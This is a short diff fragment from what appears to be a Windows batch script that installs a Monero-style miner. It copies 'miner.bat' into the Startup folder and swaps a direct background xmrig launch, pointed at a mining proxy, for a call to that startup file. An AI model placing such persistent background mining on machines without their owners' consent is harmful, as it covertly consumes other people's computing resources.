@@ -140,7 +140,7 @@ exit /b 1
 xcopy "%USERPROFILE%\setupmining\miner.bat" "%STARTUP_DIR%"
 
 echo [*] Running miner
-%USERPROFILE%\setupmining\xmrig.exe -o proxymining.rkhalid.net:3333 -u %WORKERNAME% -p %WORKERNAME% -B
+start "%STARTUP_DIR%\miner.bat"
 
 
 :OK
